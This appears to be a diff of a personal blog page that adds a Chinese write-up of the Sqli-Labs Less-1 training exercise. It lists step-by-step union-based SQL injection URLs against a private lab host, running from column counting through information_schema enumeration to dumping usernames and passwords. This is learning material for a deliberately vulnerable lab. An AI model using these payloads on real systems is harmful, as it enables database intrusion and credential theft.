@@ -12,7 +12,7 @@
 
 
 
-<title>第一篇文章 | My log</title>
+<title>Sqli-Labs--实验1 | My log</title>
 
 
 
@@ -104,7 +104,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">第一篇文章</h1>
+            <h1 class="post-title">Sqli-Labs--实验1</h1>
             
                 <div class="post-meta">
                     
@@ -113,7 +113,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十二月 27, 2019&nbsp;&nbsp;22:23:04</a>
+                        Date: <a href="#">十二月 27, 2019&nbsp;&nbsp;22:23:00</a>
                         </span>
                     
                     
@@ -122,7 +122,8 @@
         </header>
 
         <div class="post-content">
-            
+            <p>#Sqli-Labs–实验1<br>##一些基本信息：<br>Show databases;===查看所有数据库；<br>Use security;===进入security数据库；<br>Desc users;===查看users表的基本信息；<br><a href="http://172.27.163.209/Less-1/?id=1%27%20order%20by%204--+" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=1%27%20order%20by%204--+</a><br>回显：Unknown column ‘4’ in ‘order clause’<br><img src="./_image/2019-12-28-22-58-36.jpg" alt=""><br><a href="http://172.27.163.209/Less-1/?id=1’" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=1’</a> order by 3–+<br>回显：正常<br><img src="./_image/2019-12-28-22-58-51.jpg" alt=""><br>对比数据库信息：<br><img src="./_image/2019-12-28-22-59-08.jpg" alt=""><br>注：union查询，当条件为假，查询到的数据就会置顶。<br><a href="http://172.27.163.209/Less-1/?id=-2’union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2’union</a> select 1,2,3–+<br><img src="./_image/2019-12-28-22-59-42.jpg" alt=""><br>因为没有显示1，从2开始入手：<br><a href="http://172.27.163.209/Less-1/?id=-2’union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2’union</a> select 1,database(),3–+<br>查看当前连接数据库：<br><img src="./_image/2019-12-28-23-00-05.jpg" alt=""><br><a href="http://172.27.163.209/Less-1/?id=-2’union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2’union</a> select 1,user(),3–+<br>查看当前连接用户：<br><img src="./_image/2019-12-28-23-00-19.jpg" alt=""><br><a href="http://172.27.163.209/Less-1/?id=-2’union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2’union</a> select 1,user(),database()–+<br><img src="./_image/2019-12-28-23-01-53.jpg" alt=""><br><a href="http://172.27.163.209/Less-1/?id=-1&#39;union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-1&#39;union</a> select 1,group_concat(schema_name),3 from information_schema.schemata–+<br><img src="./_image/2019-12-28-23-05-30.jpg" alt=""><br>这里显示出5个数据库：由上面确认本页面连接的是：security现在将对security进行爆表。<br><a href="http://172.27.163.209/Less-1/?id=-2&#39;union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2&#39;union</a> select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+<br><img src="./_image/2019-12-28-23-05-54.jpg" alt=""><br><a href="http://172.27.163.209/Less-1/?id=-2&#39;union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2&#39;union</a> select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+<br><img src="./_image/2019-12-28-23-06-10.jpg" alt=""><br><a href="http://172.27.163.209/Less-1/?id=-2&#39;union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2&#39;union</a> select 1,username,password from users where id=1–+<br><img src="./_image/2019-12-28-23-06-22.jpg" alt=""><br>得到需要的信息。<br>###注释：<br>查询存在的数据库：<br><a href="http://172.27.163.209/Less-1/?id=-2&#39;union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2&#39;union</a> select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>查询security数据库的表：<br><a href="http://172.27.163.209/Less-1/?id=-2&#39;union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2&#39;union</a> select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+<br>因为查询security数据库知道里面有users表，对users表里面包含的列进行查询：<br><a href="http://172.27.163.209/Less-1/?id=-2&#39;union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2&#39;union</a> select 1,group_concat(column_name),3 from information_schema.columns where table_name=’uagents’–+<br>查询users表里id=2的username和password列的内容<br><a href="http://172.27.163.209/Less-1/?id=-2&#39;union" target="_blank" rel="noopener">http://172.27.163.209/Less-1/?id=-2&#39;union</a> select 1,username,password from users where id=2–+</p>
+
         </div>
 
         
@@ -136,7 +137,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://www.daican.club/2019/12/27/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">http://www.daican.club/2019/12/27/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</a></span>
+                        <span><a href="http://www.daican.club/2019/12/27/Sqli-Labs--%E5%AE%9E%E9%AA%8C1/">http://www.daican.club/2019/12/27/Sqli-Labs--%E5%AE%9E%E9%AA%8C1/</a></span>
                     </p>
                 
                 
